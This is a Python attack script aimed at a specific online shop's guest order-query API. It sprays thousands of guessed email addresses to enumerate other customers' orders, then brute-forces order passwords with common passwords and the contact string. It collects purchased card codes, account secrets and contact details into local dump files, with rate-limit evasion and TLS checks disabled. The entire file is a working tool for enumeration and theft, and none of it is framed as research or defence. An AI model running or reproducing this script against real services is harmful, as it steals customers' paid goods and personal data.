#!/usr/bin/env python3
"""qqduo.com email contact spray — guest orders keep plaintext email."""
import json
import os
import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()

OUT = Path(os.environ.get("OUT") or "/workspace/qqduo/results/dump")
OUT.mkdir(parents=True, exist_ok=True)
B = os.environ.get("BASE") or "https://qqduo.com"
WORKERS = int(os.environ.get("WORKERS") or "8")
MAX_N = int(os.environ.get("MAX_N") or "9999")

lock = threading.Lock()
tls = threading.local()
stats = {"done": 0, "hits": 0, "orders": 0, "kami": 0, "acc": 0, "errors": 0, "throttle": 0}
seen_tn = set()
kami_rows = []
accounts = set()
hit_orders = []


def log(*a):
    print(*a, flush=True)


def S():
    s = getattr(tls, "s", None)
    if not s:
        s = requests.Session()
        s.verify = False
        s.headers.update(
            {
                "User-Agent": "Mozilla/5.0",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": B,
                "Referer": B + "/user/index/query",
            }
        )
        tls.s = s
    return s


def cards(secret):
    blob = str(secret or "").replace("<br/>", "\n").replace("<br>", "\n")
    return [x.strip() for x in re.split(r"[\r\n]+", blob) if x.strip()]


def save():
    (OUT / "contact_state.json").write_text(json.dumps(stats, ensure_ascii=False), encoding="utf-8")
    (OUT / "contact_kami.json").write_text(json.dumps(kami_rows, ensure_ascii=False, indent=2), encoding="utf-8")
    (OUT / "contact_hits.json").write_text(json.dumps(hit_orders, ensure_ascii=False, indent=2), encoding="utf-8")
    (OUT / "contact_accounts.txt").write_text(
        "\n".join(sorted(accounts)) + ("\n" if accounts else ""), encoding="utf-8"
    )


def extract(j):
    if not isinstance(j, dict) or j.get("code") != 200:
        return []
    data = j.get("data")
    if isinstance(data, list):
        return data
    if isinstance(data, dict):
        return data.get("list") or []
    return []


def fetch_secret(tn, kw, has_pw):
    pws = ["", "123456", "000000", "123123", "111111", "abcdef", str(kw), str(kw).split("@")[0]]
    # dedupe
    seen = set()
    ordered = []
    for p in pws:
        if p not in seen:
            seen.add(p)
            ordered.append(p)
    for pw in ordered:
        for field in ("orderId", "tradeNo"):
            try:
                r = S().post(B + "/user/api/index/secret", data={field: tn, "password": pw}, timeout=12)
                j = r.json()
            except Exception:
                continue
            if j.get("code") == 200 and j.get("data"):
                d = j["data"]
                return (d.get("secret") if isinstance(d, dict) else d), pw, field
            msg = str(j.get("msg") or "")
            if "还未支付" in msg or "未查询到" in msg:
                if "密码错误" in msg:
                    continue
                # try next field/pw; unpaid stops
                if "还未支付" in msg:
                    return None, None, None
            if "密码错误" in msg:
                break  # try next pw with same field set
        else:
            continue
    return None, None, None


def work(kw):
    kw = str(kw)
    try:
        r = S().post(B + "/user/api/index/query", data={"keywords": kw}, timeout=12)
        j = r.json()
    except Exception:
        with lock:
            stats["errors"] += 1
            stats["done"] += 1
        return
    msg = str(j.get("msg") or "")
    if "频繁" in msg:
        with lock:
            stats["throttle"] += 1
        time.sleep(10)
        return work(kw)
    orders = [x for x in extract(j) if isinstance(x, dict)]
    # also pull secret from list if present (paid, no pw)
    with lock:
        stats["done"] += 1
        if stats["done"] % 200 == 0:
            log("progress", stats, "kw", kw)
            save()
    if not orders:
        return
    log("HIT", kw, "n", len(orders), json.dumps(orders[0], ensure_ascii=False)[:200])
    with lock:
        stats["hits"] += 1
    for od in orders:
        tn = od.get("trade_no")
        with lock:
            if not tn or tn in seen_tn:
                continue
            seen_tn.add(tn)
            od = dict(od)
            od["_query_kw"] = kw
            hit_orders.append(od)
            stats["orders"] += 1
            save()
        # secret already in list?
        sec = od.get("secret")
        if sec and od.get("password") not in (True, 1, "1"):
            cs = cards(sec)
            row = {
                "trade_no": tn,
                "query_kw": kw,
                "password": None,
                "amount": od.get("amount"),
                "contact": od.get("contact"),
                "status": od.get("status"),
                "secret": sec,
                "cards": cs,
                "card_count": len(cs),
                "source": "query_list",
            }
            with lock:
                kami_rows.append(row)
                stats["kami"] += 1
                for c in cs:
                    accounts.add(c)
                stats["acc"] = len(accounts)
                save()
            log("KAMI_LIST", tn, "cards", len(cs))
            continue
        if od.get("status") != 1:
            continue
        secret, pw, field = fetch_secret(tn, kw, od.get("password"))
        if not secret:
            continue
        cs = cards(secret)
        row = {
            "trade_no": tn,
            "query_kw": kw,
            "password": pw,
            "secret_field": field,
            "amount": od.get("amount"),
            "contact": od.get("contact"),
            "status": od.get("status"),
            "secret": secret,
            "cards": cs,
            "card_count": len(cs),
            "source": "secret",
        }
        with lock:
            kami_rows.append(row)
            stats["kami"] += 1
            for c in cs:
                accounts.add(c)
            stats["acc"] = len(accounts)
            save()
        log("KAMI", tn, "kw", kw, "pw", pw, "cards", len(cs), "amount", od.get("amount"))


def wordlist():
    locals_ = [
        "123", "1234", "12345", "123456", "123123", "12323", "111111", "000000",
        "666666", "888888", "112233", "5201314", "1314", "10086", "10010",
        "admin", "test", "qq", "qq123", "qq888", "a", "aa", "aaa", "abc", "abcd",
        "abcdef", "qwer", "qwerty", "asd", "asdf", "1", "11", "111", "12",
        "666", "888", "999", "000", "1111", "2222", "3333", "5555", "6666", "8888",
        "qqduo", "vip818", "vip818bot",
    ]
    domains = ["qq.com", "163.com", "126.com", "gmail.com", "outlook.com", "foxmail.com", "yeah.net", "sina.com", "139.com", "88.com"]
    words = []
    # proven hao998-style as emails
    for loc in locals_:
        for d in domains:
            words.append(f"{loc}@{d}")
    # numeric local parts
    for i in range(1, MAX_N + 1):
        words.append(f"{i}@qq.com")
    # common phone-like @qq
    for p in ["13800138000", "13900139000", "18888888888", "19999999999", "13000000000"]:
        words.append(f"{p}@qq.com")
    # also try bare locals in case some orders used any-contact historically
    words = locals_ + words
    seen, out = set(), []
    for w in words:
        if w not in seen:
            seen.add(w)
            out.append(w)
    return out


def main():
    words = wordlist()
    log("words", len(words), "workers", WORKERS, "base", B)
    t0 = time.time()
    with ThreadPoolExecutor(WORKERS) as ex:
        list(ex.map(work, words, chunksize=16))
    save()
    log("DONE", stats, "sec", int(time.time() - t0))


if __name__ == "__main__":
    main()
